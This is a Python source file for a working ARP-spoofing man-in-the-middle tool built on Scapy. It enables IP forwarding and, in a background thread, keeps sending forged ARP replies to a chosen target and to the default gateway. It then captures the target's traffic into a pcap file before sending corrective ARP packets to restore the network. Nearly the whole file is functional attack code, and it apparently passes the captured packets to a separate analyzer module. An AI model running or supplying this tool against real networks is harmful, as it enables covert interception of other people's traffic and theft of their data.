from scapy.all import *
import os
import sys
import threading
import time
import netifaces
import platform
import Analyzer
from subprocess import Popen, PIPE
import re


class Sniffer:

    packet_count = 1000
    interface = "en0"
    analyzer = Analyzer.Analyzer()

    # Scapy configs; verbosity and interface
    conf.verb = False
    conf.iface = interface

    def __init__(self, target_ip, filename):

        self.target_ip = target_ip
        self.target_mac = Sniffer.get_mac_from_ip(target_ip)

        self.gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
        self.gateway_mac = Sniffer.get_mac_from_ip(self.gateway_ip)

        self.filename = filename

        self.poisoning = False

    @staticmethod
    def get_mac_from_ip2(ip_addr):
        response, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_addr), retry=3, timeout=3)
        for s, r in response:
            return r[ARP].hwsrc

        return None

    @staticmethod
    def get_mac_from_ip(ip_addr):
        pid = Popen(["arp", "-n", ip_addr], stdout=PIPE)
        s = pid.communicate()[0].decode("utf-8")
        mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
        return mac


    # Send correct ARP packets to the router and target so network is restored
    def restore_network(self):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=self.target_mac, psrc=self.target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target_ip, hwsrc=self.gateway_mac, psrc=self.gateway_ip), count=5)
        Sniffer.disable_ip_forwarding()

    # Send malicious ARP packets to the router and target IP to intercept the traffic between router and user.
    def poison(self):
        while self.poisoning:
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip))
            send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip))
            time.sleep(2)

    @staticmethod
    def enable_ip_forwarding():
        if platform.system() == 'Darwin':
            os.system("sysctl -w net.inet.ip.forwarding=1")
        elif platform.system() == 'Linux':
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        else:
            print("Unsupported OS !")

    @staticmethod
    def disable_ip_forwarding():
        if platform.system() == 'Darwin':
            os.system("sysctl -w net.inet.ip.forwarding=0")
        elif platform.system() == 'Linux':
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        else:
            print("Unsupported OS !")

    def analyze_packet(self, packet):
        self.analyzer.analyze_packet(packet)


    # Sniff all packets and save to a file.
    # Restores the network after poisoning
    def sniff_packets(self, packet_count):
        if self.gateway_mac is None or self.target_mac is None:
            print("Gateway MAC or Target MAC is None")
            sys.exit(0)

        Sniffer.enable_ip_forwarding()

        self.poisoning = True
        # Start poisoning thread
        threading.Thread(target=self.poison, daemon=True).start()

        try:
            # Filter syntax is Berkeley Packet Filter syntax (BPF)
            filter = "ip host " + self.target_ip
            packets = sniff(filter=filter, iface=self.interface, count=packet_count)
            wrpcap(self.filename, packets)
            self.poisoning = False
            self.restore_network()

        except:
            self.restore_network()
